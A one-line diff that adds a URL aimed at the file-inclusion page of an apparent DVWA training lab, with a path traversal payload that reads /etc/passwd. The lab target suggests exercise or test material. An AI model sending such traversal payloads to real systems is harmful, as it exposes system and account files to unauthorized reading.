@@ -1,0 +1,1 @@
+http://dvwa.kt66.lab/vulnerabilities/fi/?page=../../../../../etc/passwd&bookcase=book05-browser-path-raw
